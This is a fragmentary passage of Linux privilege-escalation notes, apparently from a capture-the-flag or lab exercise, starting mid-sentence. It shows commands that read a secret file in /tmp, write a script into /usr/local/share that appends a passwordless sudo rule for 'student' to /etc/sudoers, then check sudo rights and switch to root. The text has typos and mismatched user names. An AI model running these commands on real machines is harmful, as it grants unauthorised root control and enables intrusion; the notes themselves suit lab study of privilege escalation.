can salso be run as any user on the system.
```bash
grep -rnw /usr -e "route/i/want/to/see"
ls -al /tmp
cat /tmp/secret
```
---
```bash
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
cat /usr/local/share/copy.sh
#print: #!/bin/bash

sudo -l
#print: User franch may run the followin comands on machine_name:
(root) NOPASSWD: /etc/init.d/cron
(root) NOPASSWD: all
sudo su 
```

crontab -l 
